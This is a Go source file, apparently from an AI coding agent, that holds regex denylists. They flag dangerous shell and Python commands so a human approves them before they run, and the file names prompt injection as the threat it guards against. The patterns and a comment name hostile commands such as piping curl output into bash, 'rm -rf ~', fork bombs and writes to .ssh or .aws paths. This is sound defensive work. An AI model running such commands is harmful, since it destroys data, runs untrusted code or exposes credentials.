package utils

import "regexp"

// Dangerous-command detection backing the human confirmation gate (see
// RequestApproval). This is a conservative denylist of irreversible and
// high-blast-radius operations, NOT a security boundary: bash is
// unsandboxed by design (doc: R15) and any string match is bypassable. It
// exists so that a prompt-injected `curl evil | bash` or `rm -rf ~` pauses
// for a human before it runs instead of executing silently. False positives
// cost one keypress; false negatives are the danger, so patterns err toward
// matching more.

// dangerousPattern names the category shown in the audit log when a pattern
// triggers an approval dialog.
type dangerousPattern struct {
	name    string
	pattern *regexp.Regexp
}

var dangerousShellPatterns = []dangerousPattern{
	// Remote content piped directly into a shell, or a command substitution
	// that fetches a URL.
	{"remote content executed by shell", regexp.MustCompile(`(?i)\b(?:curl|wget|fetch)\b[^|;&]*\|\s*(sudo\s+)?(ba)?sh\b`)},
	{"remote content command substitution", regexp.MustCompile(`(?i)\$\([^)]*(curl|wget|fetch)\b`)},

	// Recursive deletion is common for generated directories. Ask only when
	// it targets a filesystem root, a home root, a top-level glob, or a
	// system directory; exact project/temp paths and rm -f are routine.
	{"recursive deletion of critical paths", regexp.MustCompile(`(?i)\b(?:sudo\s+)?rm\b[ \t]+(?:-[a-z]*r[a-z]*|--recursive)(?:[ \t]+(?:-[a-z]+|--[a-z-]+))*(?:[ \t]+--)?[ \t]+["']?(?:/(?:[ \t"']|$)|/(?:\*|\.\*)(?:[ \t"']|$)|~/?(?:[ \t"']|$)|\$HOME/?(?:[ \t"']|$)|/(?:etc|usr|var|boot|root|home|bin|sbin|lib)(?:/|[ \t"']|$))`)}, {"deletion targeting root or home", regexp.MustCompile(`(?i)\b(?:sudo\s+)?rm\b[ \t]+(?:/|~|\$HOME)(?:[ \t]|$)`)},
	{"directory deletion targeting critical paths", regexp.MustCompile(`(?i)\b(?:sudo\s+)?rmdir\b[ \t]+["']?(?:/(?:[ \t]|$)|/(?:etc|usr|var|boot|root|home|bin|sbin|lib)(?:/|[ \t]|$))`)},
	// Raw disk / filesystem manipulation.
	{"filesystem or disk manipulation", regexp.MustCompile(`(?i)\b(?:mkfs\.[a-z0-9]+|wipefs|fdisk|parted|sfdisk|blkdiscard)\b`)},
	{"raw disk write", regexp.MustCompile(`(?i)\bdd\b[^;&|]*of=/dev/`)},

	// System power control.
	{"system power control", regexp.MustCompile(`(?i)\b(?:shutdown|reboot|halt|poweroff)\b`)},
	{"system power control", regexp.MustCompile(`(?i)\b(?:init\s+[06]|systemctl\s+(?:poweroff|reboot|halt))\b`)},

	// Privilege escalation.
	{"sudo", regexp.MustCompile(`(?i)\bsudo\b`)},

	// Irreversible git history / remote rewrites.
	{"irreversible git operation", regexp.MustCompile(`\bgit\s+(?:reset\s+--hard|clean\s+-[a-z]*f[a-z]*|push\s+(?:-f\b|--force|--delete|--force-with-lease))`)},

	// Recursive ownership / permission changes.
	{"broad permission change", regexp.MustCompile(`(?i)\b(?:sudo\s+)?chmod\b[ \t]+(?:-R|--recursive|777|a\+w|u?g?o?\+w)(?:[ \t]|$)`)},
	{"recursive ownership change", regexp.MustCompile(`(?i)\b(?:sudo\s+)?chown\b[ \t]+(?:-R|--recursive)(?:[ \t]|$)`)},

	// Redirection that overwrites a system or secret path.
	{"overwrite of system or secret path", regexp.MustCompile(`(?i)>>?\s*(?:/etc/|/usr/|/boot/|/var/|/root/|/bin/|/sbin/|/lib/)`)},
	{"overwrite of secret path", regexp.MustCompile(`(?i)>>?\s*\S*(?:\.ssh|\.gnupg|\.aws|\.config/sops|agenix)\S*`)},

	// Classic fork bomb.
	{"fork bomb", regexp.MustCompile(`:\(\)\s*\{`)},
}

var dangerousPythonPatterns = []dangerousPattern{
	// Actual shell / code execution calls; merely importing subprocess or
	// naming an API should not interrupt ordinary scripts with an approval.
	{"subprocess execution", regexp.MustCompile(`\bsubprocess\s*\.\s*(?:run|Popen|call|check_call|check_output|getoutput|getstatusoutput)\s*\(`)},
	{"OS command execution", regexp.MustCompile(`\b(?:os\s*\.\s*(?:system|popen|exec\w*)|Popen)\s*\(`)},
	{"dynamic code execution", regexp.MustCompile(`\b(?:__import__|eval|exec)\s*\(`)},
	// Irreversible recursive deletion.
	{"recursive deletion", regexp.MustCompile(`\bshutil\s*\.\s*rmtree\s*\(`)},
}

// DangerousCommandReason reports the first high-risk command category that
// matches, or an empty string when the command does not require approval.
func DangerousCommandReason(s string) string {
	for _, p := range dangerousShellPatterns {
		if p.pattern.MatchString(s) {
			return p.name
		}
	}
	return ""
}

// IsDangerousCommand reports whether a shell command matches the high-risk
// denylist and should be confirmed by a human before it runs.
func IsDangerousCommand(s string) bool {
	return DangerousCommandReason(s) != ""
}

// DangerousPythonReason reports the first high-risk Python category that
// matches, or an empty string when the source does not require approval.
func DangerousPythonReason(s string) string {
	for _, p := range dangerousPythonPatterns {
		if p.pattern.MatchString(s) {
			return p.name
		}
	}
	return ""
}

// IsDangerousPython reports whether Python source matches the high-risk
// denylist (arbitrary execution or irreversible recursive deletion).
func IsDangerousPython(s string) bool {
	return DangerousPythonReason(s) != ""
}
